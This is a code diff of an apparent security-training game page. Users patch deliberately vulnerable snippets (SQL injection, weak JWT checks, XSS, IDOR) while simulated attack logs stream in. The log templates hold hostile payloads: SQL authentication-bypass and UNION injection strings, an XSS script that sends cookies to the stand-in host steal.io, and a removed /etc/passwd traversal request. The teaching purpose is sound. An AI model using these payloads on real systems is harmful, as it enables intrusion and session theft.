@@ -2,16 +2,16 @@
 
 import { useEffect, useState, useRef, useCallback } from "react";
 
-// ── Types ──────────────────────────────────────────────────────────────────
+const PATCH_KEYS: Partial<Record<AttackType, string>> = {
+  sqli: "patched_sqli",
+  jwt_forge: "patched_jwt",
+  xss: "patched_xss",
+  idor: "patched_idor",
+};
+
 type Severity = "critical" | "high" | "medium" | "low";
-type AttackType =
-  | "jwt_forge"
-  | "sqli"
-  | "idor"
-  | "brute_force"
-  | "recon"
-  | "xss";
-type DefenseAction = "detect" | "patch" | "block" | "restore";
+type AttackType = "jwt_forge" | "sqli" | "idor" | "xss";
+type FilterTab = "all" | "acknowledged" | "fixed";
 
 type LogEntry = {
   id: string;
@@ -29,17 +29,16 @@ type LogEntry = {
   payload: string;
   country: string;
   patched: boolean;
-  blocked: boolean;
   detected: boolean;
-  restored: boolean;
 };
 
 type ScoreEntry = {
-  action: DefenseAction;
   points: number;
   ts: number;
   detail: string;
+  type: AttackType;
 };
+
 type ChallengeResult = "idle" | "running" | "pass" | "fail";
 
 type Challenge = {
@@ -52,12 +51,11 @@ type Challenge = {
   hint: string;
 };
 
-// ── Coding Challenges ──────────────────────────────────────────────────────
 const CHALLENGES: Partial<Record<AttackType, Challenge>> = {
   sqli: {
     title: "Fix: SQL Injection in Login Route",
     description:
-      "The login endpoint builds queries via string concatenation, allowing attackers to bypass authentication with ' OR '1'='1'--. Replace the vulnerable query with a parameterized prepared statement.",
+      "The login endpoint builds queries via string concatenation, allowing attackers to bypass authentication with admin'-- or ' OR '1'='1'--. Replace with a parameterized prepared statement.",
     points: 120,
     vulnerableCode: `// ❌ VULNERABLE — string concatenation
 const query = \`SELECT * FROM users
@@ -65,18 +63,23 @@ const query = \`SELECT * FROM users
   AND password='\${password}'\`;
 const [rows] = await db.query(query);`,
     starterCode: `// ✅ YOUR FIX — use parameterized queries
-// Hint: db.query() accepts (sql, [params])
-// Use ? placeholders instead of template literals
-
-const query = \`SELECT * FROM users
-  WHERE username=? AND password=?\`;
+const query = "SELECT * FROM users WHERE username=? AND password=?";
 const [rows] = await db.query(query, [/* your params here */]);`,
     validate: (code) => {
       const stillVulnerable =
         /`[^`]*\$\{username\}[^`]*`/.test(code) ||
         /`[^`]*\$\{password\}[^`]*`/.test(code);
-      const hasPlaceholder = /\?.*AND.*\?/.test(code.replace(/\s+/g, " "));
+      const hasPlaceholder =
+        /WHERE username\s*=\s*\?/.test(code.replace(/\s+/g, " ")) ||
+        /\?.*AND.*\?/.test(code.replace(/\s+/g, " "));
       const hasParams = /\[\s*(username|password)/.test(code);
+      const usesConcat = /'\s*\+\s*(username|password)/.test(code);
+      if (usesConcat)
+        return {
+          pass: false,
+          feedback:
+            "❌ Still concatenating strings — use ? placeholders instead.",
+        };
       if (stillVulnerable)
         return {
           pass: false,
@@ -97,27 +100,23 @@ const [rows] = await db.query(query, [/* your params here */]);`,
         };
       return {
         pass: true,
-        feedback:
-          "✅ Correct! Parameterized queries separate data from code, preventing injection.",
+        feedback: "✅ Correct! Parameterized queries separate data from code.",
       };
     },
-    hint: "Replace ${username} and ${password} with ? and pass [username, password] as the second argument to db.query().",
+    hint: 'Change the query to "SELECT * FROM users WHERE username=? AND password=?" and call db.query(query, [username, password]).',
   },
-
   jwt_forge: {
     title: "Fix: Weak JWT Verification",
     description:
       'The auth library accepts alg:"none" and uses a weak hardcoded secret. Fix jwt.verify() to enforce HS256 only and remove the fallback "secret".',
     points: 140,
-    vulnerableCode: `// ❌ VULNERABLE — accepts any algorithm, weak fallback secret
+    vulnerableCode: `// ❌ VULNERABLE
 import jwt from 'jsonwebtoken';
-
 export function getUserFromToken(token: string) {
   return jwt.verify(token, process.env.JWT_SECRET || 'secret');
 }`,
     starterCode: `// ✅ YOUR FIX — enforce algorithm, remove weak fallback
 import jwt from 'jsonwebtoken';
-
 export function getUserFromToken(token: string) {
   return jwt.verify(token, process.env.JWT_SECRET!, {
     algorithms: [/* specify allowed algorithm here */],
@@ -157,29 +156,22 @@ export function getUserFromToken(token: string) {
     },
     hint: 'Add algorithms: ["HS256"] to the options and remove the || "secret" fallback.',
   },
-
   xss: {
     title: "Fix: Stored XSS via dangerouslySetInnerHTML",
     description:
-      "The transfer page and search results render user data via dangerouslySetInnerHTML, allowing script injection. Replace with safe React text rendering.",
+      "The transfer page renders user data via dangerouslySetInnerHTML, allowing script injection. Replace with safe React text rendering.",
     points: 100,
-    vulnerableCode: `// ❌ VULNERABLE — renders raw user HTML
+    vulnerableCode: `// ❌ VULNERABLE
 <div dangerouslySetInnerHTML={{
   __html: \`Transfer to <b>\${lastTransfer.toAccount}</b>
            completed. Note: \${lastTransfer.note}\`,
 }} />
-
-// In search results:
 <div dangerouslySetInnerHTML={{ __html: u.username }} />`,
     starterCode: `// ✅ YOUR FIX — use safe React text rendering
-// Remove dangerouslySetInnerHTML, render values as JSX children
-
 <div>
   Transfer to <b>{lastTransfer.toAccount}</b> completed.
-  {/* How do you safely render lastTransfer.note here? */}
+  {/* Render lastTransfer.note safely here */}
 </div>
-
-// For search results username:
 <div>
   {/* Render u.username safely */}
 </div>`,
@@ -212,19 +204,17 @@ export function getUserFromToken(token: string) {
           "✅ Correct! JSX auto-escapes text nodes, preventing script injection.",
       };
     },
-    hint: "Remove dangerouslySetInnerHTML and render values directly as {lastTransfer.note} and {u.username}.",
+    hint: "Remove dangerouslySetInnerHTML and render values as {lastTransfer.note} and {u.username}.",
   },
-
   idor: {
     title: "Fix: IDOR in User Data Endpoint",
     description:
-      "The /api/user route returns any user whose ID appears in the JWT payload without ownership verification. Add server-side checks and parameterize the query.",
+      "The /api/user route returns any user whose ID appears in the JWT without ownership verification. Add server-side checks and parameterize the query.",
     points: 110,
-    vulnerableCode: `// ❌ VULNERABLE — trusts JWT id without DB ownership check
+    vulnerableCode: `// ❌ VULNERABLE
 export async function GET(req: NextRequest) {
   const token = req.headers.get('Authorization')?.replace('Bearer ', '');
   const decoded: any = getUserFromToken(token!);
-
   const [rows]: any = await db.query(
     \`SELECT * FROM users WHERE id=\${decoded.id}\`
   );
@@ -234,21 +224,16 @@ export async function GET(req: NextRequest) {
 export async function GET(req: NextRequest) {
   const token = req.headers.get('Authorization')?.replace('Bearer ', '');
   const decoded: any = getUserFromToken(token!);
-
   const [rows]: any = await db.query(
-    'SELECT * FROM users WHERE id = ?',
-    [decoded.id]
+    'SELECT * FROM users WHERE id = ?', [decoded.id]
   );
-
   const user = rows[0];
-  // Add your ownership check here:
   if (/* condition to detect id mismatch */) {
     return NextResponse.json(
       { success: false, message: 'Forbidden' },
       { status: /* correct HTTP status */ }
     );
   }
-
   return NextResponse.json({ success: true, user });
 }`,
     validate: (code) => {
@@ -285,150 +270,8 @@ export async function GET(req: NextRequest) {
     },
     hint: "Use db.query('...WHERE id = ?', [decoded.id]) and return { status: 403, message: 'Forbidden' } if user.id !== decoded.id.",
   },
-
-  brute_force: {
-    title: "Fix: No Rate Limiting on Login",
-    description:
-      "The login endpoint accepts unlimited requests, enabling credential stuffing. Implement an in-memory rate limiter: block IPs after 5 failed attempts within 60 seconds.",
-    points: 80,
-    vulnerableCode: `// ❌ VULNERABLE — no rate limiting
-export async function POST(req: NextRequest) {
-  const { username, password } = await req.json();
-  // Attacker can try 10,000 passwords per second
-  const [rows] = await db.query(
-    \`SELECT * FROM users WHERE username='\${username}'\`
-  );
-}`,
-    starterCode: `// ✅ YOUR FIX — add rate limiting
-const attempts = new Map<string, { count: number; resetAt: number }>();
-const MAX_ATTEMPTS = 5;
-const WINDOW_MS = 60_000;
-
-export async function POST(req: NextRequest) {
-  const ip = req.headers.get('x-forwarded-for') ?? 'unknown';
-
-  // 1. Get or create the record for this IP
-  // 2. If count >= MAX_ATTEMPTS and resetAt > Date.now(), return 429
-  // 3. Increment count (or reset the window if it's expired)
-  // 4. On success, you could optionally reset the counter
-
-  const record = attempts.get(ip);
-  if (record && /* window still active */ && /* over limit */) {
-    return NextResponse.json(
-      { success: false, message: 'Too many attempts. Try again later.' },
-      { status: /* correct status code */ }
-    );
-  }
-  // ... rest of login
-}`,
-    validate: (code) => {
-      const has429 = /429/.test(code);
-      const hasMap = /new Map|attempts\.get|attempts\.set/.test(code);
-      const hasMaxAttempts = /MAX_ATTEMPTS|>= 5|> 4/.test(code);
-      const hasWindow = /WINDOW_MS|Date\.now\(\)|resetAt/.test(code);
-      if (!hasMap)
-        return {
-          pass: false,
-          feedback: "❌ Use a Map to track attempts per IP address.",
-        };
-      if (!hasMaxAttempts)
-        return {
-          pass: false,
-          feedback: "❌ Define a MAX_ATTEMPTS threshold (e.g. 5).",
-        };
-      if (!hasWindow)
-        return {
-          pass: false,
-          feedback: "❌ Add a time window using Date.now() and resetAt.",
-        };
-      if (!has429)
-        return {
-          pass: false,
-          feedback:
-            "❌ Return HTTP 429 (Too Many Requests) when the limit is exceeded.",
-        };
-      return {
-        pass: true,
-        feedback:
-          "✅ Correct! Rate limiting stops brute force. In production, use Redis for distributed limiting.",
-      };
-    },
-    hint: "Check if attempts.get(ip).count >= MAX_ATTEMPTS && resetAt > Date.now(). Return status 429 if exceeded.",
-  },
-
-  recon: {
-    title: "Fix: Verbose Error Exposure",
-    description:
-      "The API returns full stack traces and internal DB error messages to clients, aiding attacker reconnaissance. Sanitize all error responses to return only generic messages.",
-    points: 60,
-    vulnerableCode: `// ❌ VULNERABLE — leaks internals
-} catch (err: any) {
-  return NextResponse.json({
-    success: false,
-    message: err.message,   // Internal DB error text
-    stack: err.stack,        // Full stack trace
-    hint: "Query execution failed",
-  }, { status: 500 });
-}`,
-    starterCode: `// ✅ YOUR FIX — generic client response, log internally
-} catch (err: any) {
-  // Log the real error server-side only
-  console.error('[API Error]', err);
-
-  return NextResponse.json({
-    success: false,
-    message: /* safe generic message here */,
-    // Remove stack, hint, err.message
-  }, { status: 500 });
-}`,
-    validate: (code) => {
-      const hasStack = /stack\s*:/.test(code);
-      const hasHint = /hint\s*:/.test(code);
-      const hasErrMessage = /message\s*:\s*err\.message/.test(code);
-      const hasGeneric =
-        /['"](An error occurred|Something went wrong|Internal server error|Request failed|Please try again)['"]/.test(
-          code,
-        );
-      const hasLog = /console\.(error|log|warn)/.test(code);
-      if (hasStack)
-        return {
-          pass: false,
-          feedback: "❌ Remove stack: err.stack — never expose stack traces.",
-        };
-      if (hasHint)
-        return {
-          pass: false,
-          feedback: "❌ Remove hint: — it aids attacker recon.",
-        };
-      if (hasErrMessage)
-        return {
-          pass: false,
-          feedback:
-            "❌ Don't send err.message — it may contain internal DB info.",
-        };
-      if (!hasGeneric)
-        return {
-          pass: false,
-          feedback:
-            '❌ Return a generic message like "An error occurred. Please try again."',
-        };
-      if (!hasLog)
-        return {
-          pass: false,
-          feedback:
-            "❌ Log the real error server-side with console.error(err).",
-        };
-      return {
-        pass: true,
-        feedback:
-          "✅ Correct! Generic errors protect internals while server-side logs keep observability.",
-      };
-    },
-    hint: 'Return { message: "An error occurred." } and log the real error with console.error(err) — never send err.message or stack to the client.',
-  },
 };
 
-// ── Helpers ────────────────────────────────────────────────────────────────
 function uid() {
   return Math.random().toString(36).slice(2, 10).toUpperCase();
 }
@@ -454,16 +297,7 @@ const USER_AGENTS = [
 
 const ATTACK_TEMPLATES: Omit<
   LogEntry,
-  | "id"
-  | "ts"
-  | "ip"
-  | "port"
-  | "patched"
-  | "blocked"
-  | "detected"
-  | "restored"
-  | "userAgent"
-  | "country"
+  "id" | "ts" | "ip" | "port" | "patched" | "detected" | "userAgent" | "country"
 >[] = [
   {
     type: "jwt_forge",
@@ -492,11 +326,22 @@ const ATTACK_TEMPLATES: Omit<
     severity: "critical",
     user: "SQLSlayer99",
     detail:
-      "Auth bypass via boolean tautology — login succeeded with injected credentials",
+      "Auth bypass — login succeeded with boolean tautology: ' OR '1'='1'-- ",
     endpoint: "/api/login",
     method: "POST",
     statusCode: 200,
-    payload: "username=' OR '1'='1'--&password=doesntmatter",
+    payload: "username=' OR '1'='1'-- &password=doesntmatter",
+  },
+  {
+    type: "sqli",
+    severity: "critical",
+    user: "ad_min_pwn",
+    detail:
+      "Auth bypass — admin account accessed via MySQL comment injection: admin'-- ",
+    endpoint: "/api/login",
+    method: "POST",
+    statusCode: 200,
+    payload: "username=admin'-- &password=anything",
   },
   {
     type: "sqli",
@@ -508,7 +353,7 @@ const ATTACK_TEMPLATES: Omit<
     method: "GET",
     statusCode: 200,
     payload:
-      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
+      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- ",
   },
   {
     type: "sqli",
@@ -519,7 +364,7 @@ const ATTACK_TEMPLATES: Omit<
     method: "GET",
     statusCode: 200,
     payload:
-      "query=' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables--",
+      "query=' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables-- ",
   },
   {
     type: "idor",
@@ -560,79 +405,45 @@ const ATTACK_TEMPLATES: Omit<
     severity: "medium",
     user: "ReflectedEvil",
     detail:
-      "Reflected XSS in search — injected <script> rendered into DOM via dangerouslySetInnerHTML",
+      "Reflected XSS in search — <script> rendered into DOM via dangerouslySetInnerHTML",
     endpoint: "/api/search",
     method: "GET",
     statusCode: 200,
     payload:
       "query=<script>document.location='https://steal.io/?x='+document.cookie</script>",
   },
-  {
-    type: "brute_force",
-    severity: "medium",
-    user: "HydraBot_31337",
-    detail:
-      "Credential stuffing: 847 login attempts in 60s from single origin, no lockout triggered",
-    endpoint: "/api/login",
-    method: "POST",
-    statusCode: 401,
-    payload: "username=admin&password=<rockyou.txt iteration #847>",
-  },
-  {
-    type: "recon",
-    severity: "low",
-    user: "PathMapper_Zero",
-    detail:
-      "Directory traversal scan — automated mapping of API endpoints and admin routes",
-    endpoint: "/api/../../../etc/passwd",
-    method: "GET",
-    statusCode: 404,
-    payload: "GET /api/../../../etc/passwd HTTP/1.1",
-  },
-  {
-    type: "recon",
-    severity: "low",
-    user: "NiktoScanner_v2",
-    detail:
-      "Verbose error leak: full stack trace returned, exposing internal DB schema details",
-    endpoint: "/api/search",
-    method: "GET",
-    statusCode: 500,
-    payload:
-      "query=' — triggered DB error with internal schema in response body",
-  },
 ];
 
 const SEV_CONFIG: Record<
   Severity,
-  { color: string; bg: string; border: string; glow: string; label: string }
+  { color: string; bg: string; border: string; dot: string; label: string }
 > = {
   critical: {
-    color: "#FF3366",
-    bg: "rgba(255,51,102,0.08)",
-    border: "rgba(255,51,102,0.25)",
-    glow: "rgba(255,51,102,0.25)",
+    color: "#b91c1c",
+    bg: "#fff1f1",
+    border: "#fca5a5",
+    dot: "#ef4444",
     label: "CRITICAL",
   },
   high: {
-    color: "#FF9933",
-    bg: "rgba(255,153,51,0.08)",
-    border: "rgba(255,153,51,0.25)",
-    glow: "rgba(255,153,51,0.18)",
+    color: "#c2410c",
+    bg: "#fff7ed",
+    border: "#fdba74",
+    dot: "#f97316",
     label: "HIGH",
   },
   medium: {
-    color: "#FACC15",
-    bg: "rgba(250,204,21,0.08)",
-    border: "rgba(250,204,21,0.25)",
-    glow: "rgba(250,204,21,0.12)",
+    color: "#a16207",
+    bg: "#fefce8",
+    border: "#fde047",
+    dot: "#eab308",
     label: "MEDIUM",
   },
   low: {
-    color: "#38BDF8",
-    bg: "rgba(56,189,248,0.08)",
-    border: "rgba(56,189,248,0.25)",
-    glow: "rgba(56,189,248,0.12)",
+    color: "#0d9488",
+    bg: "#f0fdfa",
+    border: "#5eead4",
+    dot: "#14b8a6",
     label: "LOW",
   },
 };
@@ -641,42 +452,19 @@ const TYPE_LABELS: Record<AttackType, string> = {
   jwt_forge: "JWT FORGERY",
   sqli: "SQL INJECTION",
   idor: "IDOR ATTACK",
-  brute_force: "BRUTE FORCE",
-  recon: "RECONNAISSANCE",
   xss: "XSS INJECTION",
 };
 
-const ACTION_CONFIG: Record<
-  DefenseAction,
-  { label: string; points: number; color: string; desc: string }
+const TYPE_COLORS: Record<
+  AttackType,
+  { text: string; bg: string; border: string }
 > = {
-  detect: {
-    label: "Acknowledge",
-    points: 40,
-    color: "#38BDF8",
-    desc: "Triage and log the attack",
-  },
-  patch: {
-    label: "Deploy Hotfix",
-    points: 120,
-    color: "#34D399",
-    desc: "Write the code fix",
-  },
-  block: {
-    label: "Block Origin",
-    points: 50,
-    color: "#F87171",
-    desc: "Isolate attacker IP",
-  },
-  restore: {
-    label: "Restore Data",
-    points: 30,
-    color: "#A78BFA",
-    desc: "Rollback corrupted state",
-  },
+  jwt_forge: { text: "#7c3aed", bg: "#f5f3ff", border: "#c4b5fd" },
+  sqli: { text: "#b91c1c", bg: "#fff1f1", border: "#fca5a5" },
+  idor: { text: "#0369a1", bg: "#eff6ff", border: "#bae6fd" },
+  xss: { text: "#c2410c", bg: "#fff7ed", border: "#fed7aa" },
 };
 
-// ── Component ──────────────────────────────────────────────────────────────
 export default function DefensePage() {
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [selected, setSelected] = useState<string | null>(null);
@@ -685,11 +473,11 @@ export default function DefensePage() {
   const [isRunning, setIsRunning] = useState(true);
   const [elapsed, setElapsed] = useState(0);
   const [alertFlash, setAlertFlash] = useState(false);
-  const [toast, setToast] = useState<{
-    msg: string;
-    type: "ok" | "warn";
-  } | null>(null);
+  const [toast, setToast] = useState<{ msg: string; ok: boolean } | null>(null);
   const [patchedTypes, setPatchedTypes] = useState<Set<AttackType>>(new Set());
+  const [filterTab, setFilterTab] = useState<FilterTab>("all");
+
+  // Challenge modal state
   const [challengeOpen, setChallengeOpen] = useState(false);
   const [challengeType, setChallengeType] = useState<AttackType | null>(null);
   const [challengeCode, setChallengeCode] = useState("");
@@ -700,12 +488,40 @@ export default function DefensePage() {
   const [showVulnerable, setShowVulnerable] = useState(false);
 
   const toastTimer = useRef<NodeJS.Timeout | null>(null);
-  const attackTimer = useRef<NodeJS.Timeout | null>(null);
-  const clockTimer = useRef<NodeJS.Timeout | null>(null);
+  const seenRealIds = useRef<Set<string>>(new Set());
+  const patchedTypesRef = useRef<Set<AttackType>>(new Set());
+
+  useEffect(() => {
+    patchedTypesRef.current = patchedTypes;
+  }, [patchedTypes]);
+
+  // Poll real attack log from other pages
+  useEffect(() => {
+    const poll = setInterval(() => {
+      try {
+        const raw = localStorage.getItem("real_attack_log");
+        if (!raw) return;
+        const events: LogEntry[] = JSON.parse(raw);
+        const fresh = events.filter((e) => !seenRealIds.current.has(e.id));
+        if (!fresh.length) return;
+        fresh.forEach((e) => seenRealIds.current.add(e.id));
+        setLogs((prev) => [...fresh, ...prev].slice(0, 150));
+        if (fresh.some((e) => e.severity === "critical")) {
+          setAlertFlash(true);
+          setTimeout(() => setAlertFlash(false), 600);
+        }
+      } catch {
+        /* ignore */
+      }
+    }, 600);
+    return () => clearInterval(poll);
+  }, []);
 
   const spawnAttack = useCallback(() => {
-    const available = ATTACK_TEMPLATES.filter((t) => !patchedTypes.has(t.type));
-    if (available.length === 0) return;
+    const available = ATTACK_TEMPLATES.filter(
+      (t) => !patchedTypesRef.current.has(t.type),
+    );
+    if (!available.length) return;
     const tpl = available[r(0, available.length)];
     const entry: LogEntry = {
       ...tpl,
@@ -716,115 +532,78 @@ export default function DefensePage() {
       country: COUNTRIES[r(0, COUNTRIES.length)],
       userAgent: USER_AGENTS[r(0, USER_AGENTS.length)],
       patched: false,
-      blocked: false,
       detected: false,
-      restored: false,
     };
     setLogs((prev) => [entry, ...prev].slice(0, 150));
     if (entry.severity === "critical") {
       setAlertFlash(true);
       setTimeout(() => setAlertFlash(false), 600);
     }
-  }, [patchedTypes]);
+  }, []);
 
   useEffect(() => {
-    spawnAttack();
     if (isRunning) {
-      attackTimer.current = setInterval(spawnAttack, 3200);
+      spawnAttack();
+      const t = setInterval(spawnAttack, 6000);
+      return () => clearInterval(t);
     }
-    return () => {
-      if (attackTimer.current) clearInterval(attackTimer.current);
-    };
   }, [isRunning, spawnAttack]);
 
   useEffect(() => {
-    clockTimer.current = setInterval(() => {
+    const t = setInterval(() => {
       if (isRunning) setElapsed((e) => e + 1);
     }, 1000);
-    return () => {
-      if (clockTimer.current) clearInterval(clockTimer.current);
-    };
+    return () => clearInterval(t);
   }, [isRunning]);
 
   const selectedLog = logs.find((l) => l.id === selected);
   const challenge = challengeType ? CHALLENGES[challengeType] : null;
 
-  function showToast(msg: string, type: "ok" | "warn") {
-    setToast({ msg, type });
+  function showToast(msg: string, ok = true) {
+    setToast({ msg, ok });
     if (toastTimer.current) clearTimeout(toastTimer.current);
-    toastTimer.current = setTimeout(() => setToast(null), 3000);
+    toastTimer.current = setTimeout(() => setToast(null), 2800);
   }
 
-  function doAction(action: DefenseAction) {
-    if (!selectedLog) return;
-    if (action === "detect" && selectedLog.detected) {
-      showToast("⚠ Already acknowledged", "warn");
+  function acknowledge(logId: string) {
+    const log = logs.find((l) => l.id === logId);
+    if (!log) return;
+    if (log.detected) {
+      showToast("Already acknowledged", false);
       return;
     }
-    if (action === "patch" && !selectedLog.detected) {
-      showToast("⚠ Acknowledge the threat first", "warn");
-      return;
-    }
-    if (action === "block" && selectedLog.blocked) {
-      showToast("⚠ Origin already isolated", "warn");
-      return;
-    }
-    if (action === "restore" && selectedLog.restored) {
-      showToast("⚠ Already restored", "warn");
-      return;
-    }
-    if (action === "patch") {
-      const ch = CHALLENGES[selectedLog.type];
-      if (ch) {
-        setChallengeType(selectedLog.type);
-        setChallengeCode(ch.starterCode);
-        setChallengeResult("idle");
-        setChallengeOpen(true);
-        setShowHint(false);
-        setShowVulnerable(false);
-        setChallengeFeedback("");
-        return;
-      }
-    }
-    applySimpleAction(
-      action,
-      selectedLog.id,
-      ACTION_CONFIG[action].points,
-      `${ACTION_CONFIG[action].label} on ${TYPE_LABELS[selectedLog.type]}`,
-    );
-  }
-
-  function applySimpleAction(
-    action: DefenseAction,
-    logId: string,
-    pts: number,
-    ledgerDetail: string,
-  ) {
     setLogs((prev) =>
-      prev.map((l) =>
-        l.id === logId
-          ? {
-              ...l,
-              detected: action === "detect" ? true : l.detected,
-              patched: action === "patch" ? true : l.patched,
-              blocked: action === "block" ? true : l.blocked,
-              restored: action === "restore" ? true : l.restored,
-            }
-          : l,
-      ),
+      prev.map((l) => (l.id === logId ? { ...l, detected: true } : l)),
     );
-    setScore((s) => s + pts);
-    setScoreHistory((h) =>
-      [
-        { action, points: pts, ts: Date.now(), detail: ledgerDetail },
-        ...h,
-      ].slice(0, 30),
-    );
-    showToast(`+${pts} pts — ${ACTION_CONFIG[action].label}`, "ok");
+    // No points for acknowledging
+    showToast("Threat acknowledged — now deploy a hotfix to score");
+  }
+
+  function openPatch(logId: string) {
+    const log = logs.find((l) => l.id === logId);
+    if (!log) return;
+    if (!log.detected) {
+      showToast("Acknowledge the threat first", false);
+      return;
+    }
+    if (patchedTypes.has(log.type)) {
+      showToast("This vulnerability is already patched globally", false);
+      return;
+    }
+    const ch = CHALLENGES[log.type];
+    if (ch) {
+      setChallengeType(log.type);
+      setChallengeCode(ch.starterCode);
+      setChallengeResult("idle");
+      setChallengeOpen(true);
+      setShowHint(false);
+      setShowVulnerable(false);
+      setChallengeFeedback("");
+    }
   }
 
   function submitChallenge() {
-    if (!challengeType || !challengeCode || !challenge) return;
+    if (!challengeType || !challenge) return;
     setChallengeResult("running");
     setTimeout(() => {
       const result = challenge.validate(challengeCode);
@@ -837,14 +616,17 @@ export default function DefensePage() {
           ),
         );
         setPatchedTypes((prev) => new Set([...prev, challengeType]));
-        setScore((s) => s + challenge.points);
+        const key = PATCH_KEYS[challengeType];
+        if (key) localStorage.setItem(key, "1");
+        const pts = challenge.points;
+        setScore((s) => s + pts);
         setScoreHistory((h) =>
           [
             {
-              action: "patch",
-              points: challenge.points,
+              points: pts,
               ts: Date.now(),
-              detail: `Code fix: ${TYPE_LABELS[challengeType]} patched globally`,
+              detail: `${TYPE_LABELS[challengeType]} patched globally`,
+              type: challengeType,
             },
             ...h,
           ].slice(0, 30),
@@ -869,33 +651,40 @@ export default function DefensePage() {
       minute: "2-digit",
       second: "2-digit",
     });
-  const fmtMs = (ts: number) =>
-    new Date(ts).toLocaleTimeString("en-US", {
-      hour12: false,
-      hour: "2-digit",
-      minute: "2-digit",
-      second: "2-digit",
-      fractionalSecondDigits: 3,
-    } as any);
   const fmtEl = (s: number) =>
     `${Math.floor(s / 60)
       .toString()
       .padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
 
   const critCount = logs.filter(
-    (l) => l.severity === "critical" && !l.blocked,
+    (l) => l.severity === "critical" && !patchedTypes.has(l.type),
   ).length;
-  const mono = "'JetBrains Mono', monospace";
-  const bdr = "1px solid rgba(255,255,255,0.07)";
+
+  const filteredLogs = logs.filter((l) => {
+    const isGP = patchedTypes.has(l.type);
+    if (filterTab === "acknowledged") return l.detected && !isGP;
+    if (filterTab === "fixed") return isGP;
+    return true;
+  });
+
+  const tabCounts = {
+    all: logs.length,
+    acknowledged: logs.filter((l) => l.detected && !patchedTypes.has(l.type))
+      .length,
+    fixed: logs.filter((l) => patchedTypes.has(l.type)).length,
+  };
+
+  // ── Styles ────────────────────────────────────────────────────────────────
+  const mono = "'JetBrains Mono', 'Fira Code', monospace";
+  const sans = "'IBM Plex Sans', system-ui, sans-serif";
 
   return (
     <div
       style={{
         minHeight: "100vh",
-        background:
-          "radial-gradient(circle at 50% -10%, #141525 0%, #06060f 100%)",
-        fontFamily: mono,
-        color: "#e2e8f0",
+        background: "#0f0f11",
+        fontFamily: sans,
+        color: "#e8e6e1",
         display: "flex",
         flexDirection: "column",
         fontSize: 13,
@@ -906,81 +695,111 @@ export default function DefensePage() {
           style={{
             position: "fixed",
             inset: 0,
-            border: "3px solid #FF3366",
-            background: "rgba(255,51,102,0.04)",
+            border: "2px solid #ef4444",
             pointerEvents: "none",
             zIndex: 9999,
-            animation: "flash 0.6s ease-out forwards",
+            animation: "redflash 0.5s ease-out forwards",
           }}
         />
       )}
 
-      {/* ── CHALLENGE MODAL ── */}
+      {/* ── CHALLENGE MODAL ───────────────────────────────────────── */}
       {challengeOpen && challenge && (
         <div
           style={{
             position: "fixed",
             inset: 0,
-            background: "rgba(0,0,0,0.88)",
+            background: "rgba(0,0,0,0.75)",
+            backdropFilter: "blur(6px)",
             zIndex: 1000,
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
-            padding: 20,
+            padding: 24,
           }}
         >
           <div
             style={{
               width: "100%",
-              maxWidth: 900,
-              background: "#0b0c19",
-              border: "1px solid rgba(255,255,255,0.1)",
-              borderRadius: 12,
+              maxWidth: 980,
+              background: "#16161a",
+              border: "1px solid #2a2a30",
+              borderRadius: 16,
               display: "flex",
               flexDirection: "column",
-              maxHeight: "92vh",
+              maxHeight: "94vh",
               overflow: "hidden",
-              boxShadow: "0 0 60px rgba(0,0,0,0.6)",
+              boxShadow: "0 32px 64px rgba(0,0,0,0.6)",
             }}
           >
             {/* Modal header */}
             <div
               style={{
+                padding: "20px 28px",
+                borderBottom: "1px solid #1e1e24",
+                background: "#111115",
+                flexShrink: 0,
                 display: "flex",
                 justifyContent: "space-between",
                 alignItems: "flex-start",
-                padding: "18px 22px",
-                borderBottom: bdr,
-                flexShrink: 0,
               }}
             >
               <div>
                 <div
                   style={{
-                    fontSize: 10,
-                    fontWeight: 700,
-                    letterSpacing: "0.12em",
-                    color: "#34D399",
-                    marginBottom: 6,
+                    display: "flex",
+                    alignItems: "center",
+                    gap: 10,
+                    marginBottom: 8,
                   }}
                 >
-                  ⚡ CODING CHALLENGE — DEPLOY HOTFIX
+                  <span
+                    style={{
+                      fontSize: 10,
+                      fontWeight: 700,
+                      letterSpacing: "0.14em",
+                      color: "#4ade80",
+                      background: "rgba(74,222,128,0.1)",
+                      padding: "3px 9px",
+                      borderRadius: 4,
+                      border: "1px solid rgba(74,222,128,0.2)",
+                    }}
+                  >
+                    HOTFIX CHALLENGE
+                  </span>
+                  {challengeType && (
+                    <span
+                      style={{
+                        fontSize: 10,
+                        fontWeight: 700,
+                        letterSpacing: "0.1em",
+                        color: TYPE_COLORS[challengeType].text,
+                        background: TYPE_COLORS[challengeType].bg,
+                        padding: "3px 9px",
+                        borderRadius: 4,
+                        border: `1px solid ${TYPE_COLORS[challengeType].border}`,
+                      }}
+                    >
+                      {TYPE_LABELS[challengeType]}
+                    </span>
+                  )}
                 </div>
                 <div
                   style={{
-                    fontSize: 15,
+                    fontSize: 20,
                     fontWeight: 700,
-                    color: "#f1f5f9",
-                    marginBottom: 5,
+                    color: "#f0ece4",
+                    letterSpacing: "-0.02em",
+                    marginBottom: 6,
                   }}
                 >
                   {challenge.title}
                 </div>
                 <div
                   style={{
-                    fontSize: 11,
-                    color: "rgba(255,255,255,0.42)",
-                    lineHeight: 1.6,
+                    fontSize: 13,
+                    color: "#8b8480",
+                    lineHeight: 1.65,
                     maxWidth: 560,
                   }}
                 >
@@ -991,24 +810,38 @@ export default function DefensePage() {
                 style={{
                   display: "flex",
                   alignItems: "center",
-                  gap: 14,
+                  gap: 16,
                   flexShrink: 0,
-                  marginLeft: 16,
+                  marginLeft: 24,
                 }}
               >
-                <div style={{ textAlign: "right" }}>
+                <div
+                  style={{
+                    textAlign: "center",
+                    background: "rgba(74,222,128,0.08)",
+                    border: "1px solid rgba(74,222,128,0.2)",
+                    borderRadius: 10,
+                    padding: "10px 18px",
+                  }}
+                >
                   <div
                     style={{
-                      fontSize: 9,
-                      color: "rgba(255,255,255,0.3)",
+                      fontSize: 10,
+                      color: "#4ade80",
+                      fontWeight: 700,
                       letterSpacing: "0.1em",
-                      marginBottom: 3,
+                      marginBottom: 2,
                     }}
                   >
                     REWARD
                   </div>
                   <div
